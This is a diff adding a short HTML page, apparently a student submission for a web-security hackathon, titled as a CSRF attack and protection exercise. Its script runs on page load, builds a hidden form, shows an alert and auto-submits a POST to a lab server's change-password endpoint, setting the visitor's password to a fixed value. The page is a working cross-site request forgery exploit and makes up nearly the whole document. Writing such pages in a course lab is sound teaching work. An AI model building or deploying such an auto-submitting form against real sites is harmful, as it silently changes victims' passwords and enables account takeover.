@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WAPH-Hackathon 4 Cross-site Request Forgery (CSRF) Attack and Protection</title>
+</head>
+<body>
+    <h1>WAPH-Hackathon 4 Cross-site Request Forgery (CSRF) Attack and Protection</h1>
+    <h2>By Hacker gaddiat</h2>
+    <script type="text/javascript">
+        function CSRF() {
+            var form = document.createElement('form');
+            form.action = "https://waph-hackathon.eastus.cloudapp.azure.com/csrf/changepassword.php";
+            form.method = 'POST';
+            form.target = '_self';
+            form.innerHTML = '<input type="hidden" name="newpassword" value="gaddiat"/>';
+            document.body.appendChild(form);
+            alert('Cross-site Request Forgery (CSRF) Attack for Hackathon 4 started - By gaddiat');
+            form.submit();
+        }
+        CSRF();
+    </script>
+</body>
+</html>
